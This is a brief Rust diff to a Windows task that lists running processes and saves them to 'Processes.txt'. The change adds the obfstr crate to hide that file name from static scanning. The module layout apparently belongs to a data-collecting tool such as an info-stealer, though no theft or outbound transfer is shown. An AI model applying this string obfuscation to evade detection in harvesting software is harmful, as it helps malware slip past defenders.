@@ -8,6 +8,7 @@ use utils::path::{Path, WriteToFile};
 use windows_sys::Win32::Foundation::{CloseHandle, MAX_PATH};
 use windows_sys::Win32::System::ProcessStatus::{K32EnumProcesses, K32GetModuleBaseNameA};
 use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
+use obfstr::obfstr as s;
 
 pub(super) struct ProcessesTask;
 
@@ -36,7 +37,7 @@ impl Task for ProcessesTask {
             );
         }
 
-        let path = parent / "Processes.txt";
+        let path = parent / s!("Processes.txt");
         let _ = output.write_to(&path);
     }
 }
